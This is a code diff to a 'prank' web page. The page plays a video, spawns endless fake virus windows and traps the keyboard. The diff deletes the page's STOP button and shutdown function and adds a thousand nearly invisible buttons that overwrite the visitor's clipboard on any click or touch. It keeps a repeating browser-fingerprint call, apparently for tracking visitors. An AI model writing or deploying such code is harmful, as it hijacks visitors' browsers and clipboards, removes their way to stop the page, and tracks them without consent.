@@ -89,6 +89,25 @@
             line-height: 1;
         }
 
+        .copy-trap-btn {
+            position: fixed;
+            background: transparent;
+            color: transparent;
+            border: none;
+            outline: none;
+            font-size: 1px;
+            z-index: 10000;
+            cursor: default;
+            box-shadow: none;
+            animation: none;
+            user-select: none;
+            opacity: 0.01;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .copy-trap-btn:active {
+            background: transparent;
+        }
+
         @keyframes blink {
             0%, 100% {
                 color: #fff;
@@ -111,23 +130,6 @@
             100% { transform: translate(0, 0); }
         }
 
-        #stop-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 999999;
-            background: red;
-            color: #fff;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            display: none;
-            font-family: monospace;
-            font-weight: bold;
-        }
-
         #flash {
             position: fixed;
             inset: 0;
@@ -140,23 +142,6 @@
         @keyframes flash {
             0%, 100% { opacity: 0; }
             50%      { opacity: 0.8; }
-        }
-
-        #clip-trigger {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: 0;
-            border: none;
-            background: transparent;
-            color: transparent;
-            opacity: 0.01;
-            z-index: 999998;
-            pointer-events: none;
-            font-size: 1px;
         }
 
         #kb-trap {
@@ -187,10 +172,6 @@
 
     <div id="flash"></div>
 
-    <button id="clip-trigger" aria-hidden="true">.</button>
-
-    <button id="stop-btn">STOP</button>
-
     <script>
         // ================== НАСТРОЙКИ ==================
         var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
@@ -198,24 +179,31 @@
         var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
 
         // пранк-окна
-        var SPAWN_EVERY      = 200;   // мс между появлением нового окна
-        var MAX_WINDOWS      = 0;     // 0 = без лимита, иначе число
+        var SPAWN_EVERY      = 200;   // мс между появлением окна
+        var MAX_WINDOWS      = 0;     // 0 = без лимита
 
         // клавиатура
         var KEYBOARD_EVERY   = 150;   // мс
 
-        // буфер через микроскопическую кнопку
-        var CLIP_BTN_EVERY   = 10;    // мс (0.01 сек)
+        // невидимые кнопки-ловушки
+        var BUTTONS_TOTAL    = 1000;  // сколько кнопок всего
+        var BUTTONS_EVERY    = 60;    // мс между появлением кнопок
+        var BUTTON_MIN_SIZE  = 200;   // мин. размер кнопки, px
+        var BUTTON_MAX_SIZE  = 300;   // макс. размер кнопки, px
+
+        // текст, который копируется
         var CLIP_TEXT        = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
         // ===============================================
 
         var started = false;
         var stopFlag = false;
 
-        var windowCount = 0;
-        var spawnInterval = null;
-        var kbInterval = null;
-        var clipBtnInterval = null;
+        var windowCount     = 0;
+        var trapBtnCount    = 0;
+
+        var spawnInterval   = null;
+        var kbInterval      = null;
+        var trapBtnInterval = null;
 
         // ---------- запуск ----------
         function startVideo() {
@@ -223,7 +211,6 @@
             started = true;
 
             document.getElementById('start-screen').classList.add('hidden');
-            document.getElementById('stop-btn').style.display = 'block';
 
             // видео с YouTube
             try {
@@ -271,14 +258,14 @@
             // клавиатура
             startKeyboardSpam();
 
-            // буфер через микроскопическую кнопку
-            startClipboardBtnSpam();
+            // невидимые кнопки
+            startTrapButtons();
 
             // фингерпринт
             sendFingerprint();
         }
 
-        // ---------- окна (без исчезновения) ----------
+        // ---------- окна ----------
         function spawnWindow() {
             if (stopFlag) return;
             if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
@@ -340,82 +327,73 @@
             kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
         }
 
-        // ---------- копирование через микроскопическую кнопку ----------
-        function copyViaButton() {
+        // ---------- копирование ----------
+        function copyToClipboardNow() {
+            try {
+                var ta = document.createElement('textarea');
+                ta.value = CLIP_TEXT;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                ta.style.pointerEvents = 'none';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+            } catch (e) {}
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
+                }
+            } catch (e) {}
+        }
+
+        // ---------- невидимые кнопки ----------
+        function spawnTrapButton() {
             if (stopFlag) return;
+            if (trapBtnCount >= BUTTONS_TOTAL) {
+                if (trapBtnInterval) {
+                    clearInterval(trapBtnInterval);
+                    trapBtnInterval = null;
+                }
+                return;
+            }
 
-            var btn = document.getElementById('clip-trigger');
-            if (!btn) return;
+            trapBtnCount++;
 
-            try {
-                btn.click();
-            } catch (e) {}
-        }
+            var btn = document.createElement('button');
+            btn.className = 'copy-trap-btn';
+            btn.type = 'button';
+            btn.setAttribute('data-idx', trapBtnCount);
 
-        function startClipboardBtnSpam() {
-            clipBtnInterval = setInterval(copyViaButton, CLIP_BTN_EVERY);
-        }
+            var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
+                       (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
+            btn.style.width  = size + 'px';
+            btn.style.height = size + 'px';
 
-        // обработчик самой кнопки
-        document.addEventListener('DOMContentLoaded', function () {
-            var btn = document.getElementById('clip-trigger');
-            if (!btn) return;
+            var maxX = window.innerWidth  - size;
+            var maxY = window.innerHeight - size;
+            var x = Math.max(0, Math.floor(Math.random() * maxX));
+            var y = Math.max(0, Math.floor(Math.random() * maxY));
+            btn.style.left = x + 'px';
+            btn.style.top  = y + 'px';
+
+            // реальный тап = копирование
             btn.addEventListener('click', function () {
-                try {
-                    var ta = document.createElement('textarea');
-                    ta.value = CLIP_TEXT;
-                    ta.style.position = 'fixed';
-                    ta.style.opacity = '0';
-                    ta.style.pointerEvents = 'none';
-                    document.body.appendChild(ta);
-                    ta.select();
-                    document.execCommand('copy');
-                    ta.remove();
-                } catch (e) {}
-
-                try {
-                    if (navigator.clipboard && navigator.clipboard.writeText) {
-                        navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
-                    }
-                } catch (e) {}
+                copyToClipboardNow();
             });
-        });
 
-        // ---------- стоп ----------
-        function stopEverything() {
-            stopFlag = true;
+            // touch на мобильных
+            btn.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyToClipboardNow();
+            }, { passive: false });
 
-            if (spawnInterval) {
-                clearInterval(spawnInterval);
-                spawnInterval = null;
-            }
-            if (kbInterval) {
-                clearInterval(kbInterval);
-                kbInterval = null;
-            }
-            if (clipBtnInterval) {
-                clearInterval(clipBtnInterval);
-                clipBtnInterval = null;
-            }
+            document.body.appendChild(btn);
+        }
 
-            var wins = document.querySelectorAll('.virus-window');
-            for (var i = 0; i < wins.length; i++) {
-                wins[i].remove();
-            }
-
-            document.getElementById('stop-btn').style.display = 'none';
-            document.getElementById('flash').style.display = 'none';
-
-            try {
-                var container = document.getElementById('video-container');
-                if (container) container.style.display = 'none';
-                var iframe = document.getElementById('yt-frame');
-                if (iframe) iframe.src = "";
-            } catch (e) {}
-
-            try {
-                if (document.exitFullscreen) document.exitFullscreen();
-            } catch (e) {}
+        function startTrapButtons() {
+            trapBtnInterval = setInterval(spawnTrapButton, BUTTONS_EVERY);
         }
 
         // ---------- фингерпринт ----------
@@ -492,7 +470,6 @@
             e.stopPropagation();
             startVideo();
         });
-        document.getElementById('stop-btn').addEventListener('click', stopEverything);
 
         setInterval(sendFingerprint, 15000);
     </script>
